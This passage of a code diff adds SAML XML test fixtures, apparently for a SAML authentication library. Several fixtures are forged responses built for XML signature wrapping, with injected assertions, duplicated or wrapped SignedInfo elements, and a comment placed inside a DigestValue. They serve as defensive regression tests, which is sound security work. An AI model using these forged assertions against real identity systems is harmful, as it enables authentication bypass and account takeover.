xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" ID=\"GOSAMLR13708454654483\" Version=\"2.0\" IssueInstant=\"2013-06-10T06:24:25Z\" Destination=\"ForNodeJS\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status><saml:Assertion xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"OUR_CUSTOM_ID\" IssueInstant=\"2013-06-10T06:24:25Z\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/><ds:Reference URI=\"#pfx4790de7a-ba67-cdfe-122c-e557ad3b3743\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>Gx0mTydMn1k6804jZBrdUrZmbV4=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignedInfo><ds:Reference URI=\"#OUR_CUSTOM_ID\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>jGst6BnAC9xOeqa6hKNPsoMm2TY=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>oHEPKtwoCbfq1QRm2pjx35zVMqAsti4nQU+3ws8EUJUXHmPG2EoX3HBkb7D2wN4m+ZFrdwARUpNJlhhOIz/eG4jES6ar0tvlNN3qE5cqcQhwZHyRARLnTlERqyZU9Qm729DnAGBeXCdMb736zi16onOIVPNA63LRTzUIxhyZqypDCf1wd6me/ur6UUgH11nYOu4JDYx0iWNkXc1Nad7vkF9oMPeO1QsMxuZSIVH4tvdJkue+qAnu2l+dFJb0LPfm+xmIC0FBo+VX1ECCWRoUZIxjotQfAM6yZpHIi5fNqPXkVyN9fYoUEa9CafqHlc4tAAdgAgGeOqA3jWeC8ZnOVA==</ds:SignatureValue><ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIEHjCCAwagAwIBAgIBATANBgkqhkiG9w0BAQUFADBnMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UEBwwMU2FudGEgTW9uaWNhMREwDwYDVQQKDAhPbmVMb2dpbjEZMBcGA1UEAwwQYXBwLm9uZWxvZ2luLmNvbTAeFw0xMzA1MjcwODU1MTNaFw0xODA1MjcwODU1MTNaMGcxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApDYWxpZm9ybmlhMRUwEwYDVQQHDAxTYW50YSBNb25pY2ExETAPBgNVBAoMCE9uZUxvZ2luMRkwFwYDVQQDDBBhcHAub25lbG9naW4uY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoXoc7IFZQRv+SwJ15zjIl9touwY5e6b7H4vn3OtOUByjOKHUX8VX0TpbAV2ctZE2GSALx1AGuQAv6O4MVUH+qn/2IAiBY3a7zKN07UBsya7xFMQVHuGE6EiBAs9jpA9wjvYMPRkS5wYZcwjpTQSZK7zFPPtobG8K/1vDbm/tWZjNLmZmQePmXpwrQAuC0+NlzlmnjoQYB2xp2NaTUK9JnnmuB5qev3dpUwlYGSJpf+HUIoxuo8IpxAXOymq1d6tEEJgU1kR2sa7o1sSRFo31YeW/qYCP/gcLJZo3MRUDFe0g5MHeliFue9DsKYUsC6qwAD3gc+MI47buiD6Msu11cwIDAQABo4HUMIHRMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYEFAAJFJRIlpQQSFsuNdeq7FkTJIH4MIGRBgNVHSMEgYkwgYaAFAAJFJRIlpQQSFsuNdeq7FkTJIH4oWukaTBnMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UEBwwMU2FudGEgTW9uaWNhMREwDwYDVQQKDAhPbmVMb2dpbjEZMBcGA1UEAwwQYXBwLm9uZWxvZ2luLmNvbYIBATAOBgNVHQ8BAf8EBAMCBPAwDQYJKoZIhvcNAQEFBQADggEBAB9zN+g6N4sUBE61RaMUH2LSHWwOtfhL64i7pjHjvZa47/qcV/S0Yyd4IE44ho9i2N+AM79d34mThc30oK5aVxOKphKf+xM/cOyVaWIeqr+dCbkY/0OpLEwWOh9VSgOizRO3evLMurbtR892LbSK/Td3hG5jfwoHD23nHH87Dv/3KyZox9MkJdY2DXOHGGIcsqoIifaTyNZyhW6RgwEujQ6LjsaolP1YoeV85TZFKTLa1Ta7ZLUVUC2UJWqz+kRlsyGxf+E/ZmJ7hSq0ZBVHrVOyXjCcFn6X0/W5SrpOmN3fZYcj8Bp6vhB0cJk9qpjgWOP2RCuBdHZVawjCjIaE+bc=</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">anyone@gmail.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2013-06-10T06:27:25Z\" Recipient=\"ForNodeJS\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2013-06-10T06:21:25Z\" NotOnOrAfter=\"2013-06-10T06:27:25Z\"><saml:AudienceRestriction><saml:Audience>ForNodeJS</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2013-06-10T06:24:24Z\" SessionNotOnOrAfter=\"2013-06-11T06:24:25Z\" SessionIndex=\"_5246a870-b3c4-0130-1bcd-782bcb56fcaa\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"PersonImmutableID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.email\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">kartik.cds@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.FirstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">KartikCDS</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.Username\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"office\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.LastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"memberOf\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute></saml:AttributeStatement></saml:Assertion><a><saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"pfx4790de7a-ba67-cdfe-122c-e557ad3b3743\" IssueInstant=\"2013-06-10T06:24:25Z\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">kartik.cds@gmail.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2013-06-10T06:27:25Z\" Recipient=\"ForNodeJS\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2013-06-10T06:21:25Z\" NotOnOrAfter=\"2013-06-10T06:27:25Z\"><saml:AudienceRestriction><saml:Audience>ForNodeJS</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2013-06-10T06:24:24Z\" SessionNotOnOrAfter=\"2013-06-11T06:24:25Z\" SessionIndex=\"_5246a870-b3c4-0130-1bcd-782bcb56fcaa\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"PersonImmutableID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.email\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">kartik.cds@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.FirstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">KartikCDS</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.Username\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"office\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.LastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"memberOf\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute></saml:AttributeStatement></saml:Assertion></a></samlp:Response>\n```\n\nFilename: test/static/saml_wrapped_signed_info_node.xml:\n```\n@@ -0,0 +1 @@\n+<samlp:Response xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" ID=\"GOSAMLR13708454654483\" Version=\"2.0\" IssueInstant=\"2013-06-10T06:24:25Z\" Destination=\"ForNodeJS\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status><saml:Assertion xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"OUR_CUSTOM_ID\" IssueInstant=\"2013-06-10T06:24:25Z\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><WRAPPER><ds:SignedInfo><ds:Reference URI=\"#OUR_CUSTOM_ID\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>jGst6BnAC9xOeqa6hKNPsoMm2TY=</ds:DigestValue></ds:Reference></ds:SignedInfo></WRAPPER><ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/><ds:Reference URI=\"#pfx4790de7a-ba67-cdfe-122c-e557ad3b3743\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>Gx0mTydMn1k6804jZBrdUrZmbV4=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>oHEPKtwoCbfq1QRm2pjx35zVMqAsti4nQU+3ws8EUJUXHmPG2EoX3HBkb7D2wN4m+ZFrdwARUpNJlhhOIz/eG4jES6ar0tvlNN3qE5cqcQhwZHyRARLnTlERqyZU9Qm729DnAGBeXCdMb736zi16onOIVPNA63LRTzUIxhyZqypDCf1wd6me/ur6UUgH11nYOu4JDYx0iWNkXc1Nad7vkF9oMPeO1QsMxuZSIVH4tvdJkue+qAnu2l+dFJb0LPfm+xmIC0FBo+VX1ECCWRoUZIxjotQfAM6yZpHIi5fNqPXkVyN9fYoUEa9CafqHlc4tAAdgAgGeOqA3jWeC8ZnOVA==</ds:SignatureValue><ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIEHjCCAwagAwIBAgIBATANBgkqhkiG9w0BAQUFADBnMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UEBwwMU2FudGEgTW9uaWNhMREwDwYDVQQKDAhPbmVMb2dpbjEZMBcGA1UEAwwQYXBwLm9uZWxvZ2luLmNvbTAeFw0xMzA1MjcwODU1MTNaFw0xODA1MjcwODU1MTNaMGcxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApDYWxpZm9ybmlhMRUwEwYDVQQHDAxTYW50YSBNb25pY2ExETAPBgNVBAoMCE9uZUxvZ2luMRkwFwYDVQQDDBBhcHAub25lbG9naW4uY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoXoc7IFZQRv+SwJ15zjIl9touwY5e6b7H4vn3OtOUByjOKHUX8VX0TpbAV2ctZE2GSALx1AGuQAv6O4MVUH+qn/2IAiBY3a7zKN07UBsya7xFMQVHuGE6EiBAs9jpA9wjvYMPRkS5wYZcwjpTQSZK7zFPPtobG8K/1vDbm/tWZjNLmZmQePmXpwrQAuC0+NlzlmnjoQYB2xp2NaTUK9JnnmuB5qev3dpUwlYGSJpf+HUIoxuo8IpxAXOymq1d6tEEJgU1kR2sa7o1sSRFo31YeW/qYCP/gcLJZo3MRUDFe0g5MHeliFue9DsKYUsC6qwAD3gc+MI47buiD6Msu11cwIDAQABo4HUMIHRMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYEFAAJFJRIlpQQSFsuNdeq7FkTJIH4MIGRBgNVHSMEgYkwgYaAFAAJFJRIlpQQSFsuNdeq7FkTJIH4oWukaTBnMQswCQYDVQQGEwJVUzETMBEGA1UECAwKQ2FsaWZvcm5pYTEVMBMGA1UEBwwMU2FudGEgTW9uaWNhMREwDwYDVQQKDAhPbmVMb2dpbjEZMBcGA1UEAwwQYXBwLm9uZWxvZ2luLmNvbYIBATAOBgNVHQ8BAf8EBAMCBPAwDQYJKoZIhvcNAQEFBQADggEBAB9zN+g6N4sUBE61RaMUH2LSHWwOtfhL64i7pjHjvZa47/qcV/S0Yyd4IE44ho9i2N+AM79d34mThc30oK5aVxOKphKf+xM/cOyVaWIeqr+dCbkY/0OpLEwWOh9VSgOizRO3evLMurbtR892LbSK/Td3hG5jfwoHD23nHH87Dv/3KyZox9MkJdY2DXOHGGIcsqoIifaTyNZyhW6RgwEujQ6LjsaolP1YoeV85TZFKTLa1Ta7ZLUVUC2UJWqz+kRlsyGxf+E/ZmJ7hSq0ZBVHrVOyXjCcFn6X0/W5SrpOmN3fZYcj8Bp6vhB0cJk9qpjgWOP2RCuBdHZVawjCjIaE+bc=</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">anyone@gmail.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2013-06-10T06:27:25Z\" Recipient=\"ForNodeJS\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2013-06-10T06:21:25Z\" NotOnOrAfter=\"2013-06-10T06:27:25Z\"><saml:AudienceRestriction><saml:Audience>ForNodeJS</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2013-06-10T06:24:24Z\" SessionNotOnOrAfter=\"2013-06-11T06:24:25Z\" SessionIndex=\"_5246a870-b3c4-0130-1bcd-782bcb56fcaa\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"PersonImmutableID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.email\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">kartik.cds@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.FirstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">KartikCDS</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.Username\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"office\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.LastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"memberOf\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute></saml:AttributeStatement></saml:Assertion><a><saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" Version=\"2.0\" ID=\"pfx4790de7a-ba67-cdfe-122c-e557ad3b3743\" IssueInstant=\"2013-06-10T06:24:25Z\"><saml:Issuer>https://app.onelogin.com/saml/metadata/164679</saml:Issuer><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">kartik.cds@gmail.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2013-06-10T06:27:25Z\" Recipient=\"ForNodeJS\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2013-06-10T06:21:25Z\" NotOnOrAfter=\"2013-06-10T06:27:25Z\"><saml:AudienceRestriction><saml:Audience>ForNodeJS</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2013-06-10T06:24:24Z\" SessionNotOnOrAfter=\"2013-06-11T06:24:25Z\" SessionIndex=\"_5246a870-b3c4-0130-1bcd-782bcb56fcaa\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"PersonImmutableID\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.email\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">kartik.cds@gmail.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.FirstName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">KartikCDS</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"User.Username\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"office\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"User.LastName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute><saml:Attribute Name=\"memberOf\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:basic\"><saml:AttributeValue xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\"/></saml:Attribute></saml:AttributeStatement></saml:Assertion></a></samlp:Response>\n```\n\nFilename: test/static/valid_saml_with_digest_comment.xml:\n```\n@@ -0,0 +1,7 @@\n+<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"pfx94e4a319-b6f7-4a40-25d1-01fcb642e4c5\" Version=\"2.0\" IssueInstant=\"2012-07-03T11:32:20Z\" Destination=\"http://localhost:3000/login/callback\" InResponseTo=\"_d766d16611ac0d14121b\"><saml:Issuer>https://openidp.feide.no</saml:Issuer><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status>\n+<saml:Assertion xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" ID=\"pfx66496e6c-3c29-230d-6d47-b245434b872d\" Version=\"2.0\" IssueInstant=\"2012-07-03T11:32:20Z\"><saml:Issuer>https://openidp.feide.no</saml:Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n+  <ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n+    <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>\n+  <ds:Reference URI=\"#pfx66496e6c-3c29-230d-6d47-b245434b872d\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue><!--6zWeUASlD8E73xzDn4ggf0r7ysQ=-->RnNjoyUguwze5w2R+cboyTHlkQk=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>aw5711jKP7xragunjRRCAD4mT4xKHc37iohBpQDbdSomD3ksOSB96UZQp0MtaC3xlVSkMtYw85Om96T2q2xrxLLYVA50eFJEMMF7SCVPStWTVjBlaCuOPEQxIaHyJs9Sy3MCEfbBh4Pqn9IJBd1kzwdlCrWWjAmksbFFg5wHQJA=</ds:SignatureValue>\n+<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIICizCCAfQCCQCY8tKaMc0BMjANBgkqhkiG9w0BAQUFADCBiTELMAkGA1UEBhMCTk8xEjAQBgNVBAgTCVRyb25kaGVpbTEQMA4GA1UEChMHVU5JTkVUVDEOMAwGA1UECxMFRmVpZGUxGTAXBgNVBAMTEG9wZW5pZHAuZmVpZGUubm8xKTAnBgkqhkiG9w0BCQEWGmFuZHJlYXMuc29sYmVyZ0B1bmluZXR0Lm5vMB4XDTA4MDUwODA5MjI0OFoXDTM1MDkyMzA5MjI0OFowgYkxCzAJBgNVBAYTAk5PMRIwEAYDVQQIEwlUcm9uZGhlaW0xEDAOBgNVBAoTB1VOSU5FVFQxDjAMBgNVBAsTBUZlaWRlMRkwFwYDVQQDExBvcGVuaWRwLmZlaWRlLm5vMSkwJwYJKoZIhvcNAQkBFhphbmRyZWFzLnNvbGJlcmdAdW5pbmV0dC5ubzCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAt8jLoqI1VTlxAZ2axiDIThWcAOXdu8KkVUWaN/SooO9O0QQ7KRUjSGKN9JK65AFRDXQkWPAu4HlnO4noYlFSLnYyDxI66LCr71x4lgFJjqLeAvB/GqBqFfIZ3YK/NrhnUqFwZu63nLrZjcUZxNaPjOOSRSDaXpv1kb5k3jOiSGECAwEAATANBgkqhkiG9w0BAQUFAAOBgQBQYj4cAafWaYfjBU2zi1ElwStIaJ5nyp/s/8B8SAPK2T79McMyccP3wSW13LHkmM1jwKe3ACFXBvqGQN0IbcH49hu0FKhYFM/GPDJcIHFBsiyMBXChpye9vBaTNEBCtU3KjjyG0hRT2mAQ9h+bkPmOvlEo/aH0xR68Z9hw4PF13w==</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature><saml:Subject><saml:NameID SPNameQualifier=\"passport-saml\" Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\">test@example.com</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2012-07-03T11:37:20Z\" Recipient=\"http://localhost:3000/login/callback\" InResponseTo=\"_d766d16611ac0d14121b\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2012-07-03T11:31:50Z\" NotOnOrAfter=\"2012-07-03T11:37:20Z\"><saml:AudienceRestriction><saml:Audience>passport-saml</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant=\"2012-07-03T11:32:20Z\" SessionNotOnOrAfter=\"2012-07-03T19:32:20Z\" SessionIndex=\"_c8e6823fe38ddbce125f9be6e5118b8c352d04bcae\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name=\"uid\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">bergie</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"givenName\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"sn\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"cn\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue xsi:type=\"xs:string\">Henri Bergius</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"mail\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"><saml:AttributeValue 